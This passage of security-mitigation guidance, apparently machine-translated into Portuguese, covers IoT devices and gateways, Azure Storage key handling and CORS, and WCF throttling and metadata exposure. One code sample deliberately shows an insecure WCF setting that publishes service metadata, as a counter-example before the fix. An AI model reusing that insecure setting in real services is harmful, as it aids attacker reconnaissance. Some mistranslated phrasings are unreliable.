| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | O Windows 10 IoT Core implementa uma versão leve da Encriptação do Dispositivo bit-locker, que tem uma forte dependência da presença de um TPM na plataforma, incluindo o protocolo pré-OS necessário na UEFI que realiza as medições necessárias. Estas medições pré-OS garantem que o SISTEMA mais tarde tem um registo definitivo de como o SO foi lançado. Criptografe as divisórias de SO usando bit-locker e quaisquer divisórias adicionais também no caso de armazenarem quaisquer dados sensíveis. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Certifique-se de que apenas os serviços/funcionalidades mínimos estão habilitados nos dispositivos

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | Não ative nem desligue quaisquer funcionalidades ou serviços no SISTEMA que não sejam necessários para o funcionamento da solução. Por exemplo, se o dispositivo não necessitar de um UI, instale o Windows IoT Core em modo sem cabeça. |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Encripte o SO e divisórias adicionais de IoT Field Gateway com bit-locker

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de campo IoT | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | O Windows 10 IoT Core implementa uma versão leve da Encriptação do Dispositivo bit-locker, que tem uma forte dependência da presença de um TPM na plataforma, incluindo o protocolo pré-OS necessário na UEFI que realiza as medições necessárias. Estas medições pré-OS garantem que o SISTEMA mais tarde tem um registo definitivo de como o SO foi lançado. Criptografe as divisórias de SO usando bit-locker e quaisquer divisórias adicionais também no caso de armazenarem quaisquer dados sensíveis. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Certifique-se de que as credenciais de login predefinidos do gateway de campo são alteradas durante a instalação

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de campo IoT | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | Certifique-se de que as credenciais de login predefinidos do gateway de campo são alteradas durante a instalação |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Certifique-se de que o Cloud Gateway implementa um processo para manter o firmware de dispositivos conectados atualizado

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de nuvem IoT | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | Escolha gateway - Azure IoT Hub |
| **Referências**              | [Visão geral da gestão de dispositivos IoT Hub](../../iot-hub/iot-hub-device-management-overview.md), [Como atualizar o Firmware do Dispositivo](../../iot-hub/tutorial-firmware-update.md) |
| **Passos** | LWM2M é um protocolo da Open Mobile Alliance for IoT Device Management. A gestão do dispositivo Azure IoT permite interagir com dispositivos físicos usando trabalhos de dispositivos. Certifique-se de que o Cloud Gateway implementa um processo para manter o dispositivo e outros dados de configuração atualizados utilizando a Gestão de Dispositivos Azure IoT Hub. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Certifique-se de que os dispositivos têm controlos de segurança de ponto final configurados de acordo com as políticas organizacionais

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Limite de confiança da máquina | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | Certifique-se de que os dispositivos têm controlos de segurança de ponto final, tais como bit-locker para encriptação ao nível do disco, antivírus com assinaturas atualizadas, firewall baseado em hospedeiro, atualizações de sistemas operativos, políticas de grupo, etc. são configurados de acordo com as políticas de segurança organizacional. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Garantir uma gestão segura das chaves de acesso ao armazenamento Azure

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Armazenamento do Azure | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | [Guia de segurança de armazenamento Azure - Gerir as chaves da sua conta de armazenamento](../../storage/blobs/security-recommendations.md#identity-and-access-management) |
| **Passos** | <p>Armazenamento de chaves: É aconselhável armazenar as teclas de acesso Azure Storage no Cofre da Chave Azure como um segredo e fazer com que as aplicações recuperem a chave do cofre da chave. Isto é recomendado devido às seguintes razões:</p><ul><li>A aplicação nunca terá a chave de armazenamento codificada num ficheiro de configuração, que remove aquela avenida de alguém ter acesso às chaves sem permissão específica</li><li>O acesso às teclas pode ser controlado utilizando o Azure Ative Directory. Isto significa que um proprietário de conta pode conceder acesso a um punhado de aplicações que precisam de recuperar as chaves do Cofre da Chave Azure. Outras aplicações não poderão aceder às chaves sem lhes conceder permissão especificamente</li><li>Regeneração chave: Recomenda-se ter um processo em vigor para regenerar as chaves de acesso ao armazenamento Azure por razões de segurança. Os detalhes sobre o porquê e como planear a regeneração chave estão documentados no artigo de referência do Guia de Segurança do Armazenamento Azure</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Certifique-se de que só são permitidas origens fidedignas se o CORS estiver ativado no armazenamento do Azure

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Armazenamento do Azure | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | Genérica |
| **Atributos**              | N/D  |
| **Referências**              | [Suporte CORS para os Serviços de Armazenamento do Azure](/rest/api/storageservices/Cross-Origin-Resource-Sharing--CORS--Support-for-the-Azure-Storage-Services) |
| **Passos** | O Azure Storage permite-lhe ativar a PARTILHA de Recursos CORS – Cross Origin. Para cada conta de armazenamento, pode especificar domínios que podem aceder aos recursos nessa conta de armazenamento. Por predefinição, o CORS é desativado em todos os serviços. Pode ativar o CORS utilizando a API REST ou a biblioteca do cliente de armazenamento para ligar para um dos métodos para definir as políticas de serviço. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>Ativar a funcionalidade de estrangulamento de serviço da WCF

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | .Net Framework 3 |
| **Atributos**              | N/D  |
| **Referências**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [Reino fortificado](https://vulncat.fortify.com) |
| **Passos** | <p>Não impor um limite à utilização de recursos do sistema poderia resultar na exaustão dos recursos e, em última análise, na negação de serviço.</p><ul><li>**EXPLICAÇÃO:** A Windows Communication Foundation (WCF) oferece a capacidade de acelerar os pedidos de serviço. Permitir demasiados pedidos de clientes pode inundar um sistema e esgotar os seus recursos. Por outro lado, permitir que apenas um pequeno número de pedidos a um serviço pode impedir que utilizadores legítimos utilizem o serviço. Cada serviço deve ser individualmente sintonizado e configurado para permitir a quantidade adequada de recursos.</li><li>**RECOMENDAÇÕES** Ativar a funcionalidade de estrangulamento de serviço da WCF e definir limites adequados para a sua aplicação.</li></ul>|

### <a name="example"></a>Exemplo
Segue-se uma configuração de exemplo com estrangulamento ativado:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>Divulgação de informação do WCF através de metadados

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase SDL**               | Compilar |  
| **Tecnologias aplicáveis** | .Net Framework 3 |
| **Atributos**              | N/D  |
| **Referências**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [Reino fortificado](https://vulncat.fortify.com) |
| **Passos** | Os metadados podem ajudar os atacantes a aprender sobre o sistema e a planear uma forma de ataque. Os serviços do WCF podem ser configurados para expor metadados. Os metadados dão informações detalhadas sobre a descrição do serviço e não devem ser transmitidos em ambientes de produção. As `HttpGetEnabled`  /  `HttpsGetEnabled` propriedades da classe ServiceMetaData definem se um serviço irá expor os metadados | 

### <a name="example"></a>Exemplo
O código abaixo instrui a WCF a transmitir os metadados de um serviço
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Não transmita metadados de serviço num ambiente de produção. Desafie as propriedades HttpGetEnabled / HttpsGetEnabled da classe ServiceMetaData em falso. 

### <a name="example"></a>Exemplo
O código abaixo instrui a WCF a não transmitir os metadados de um serviço. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```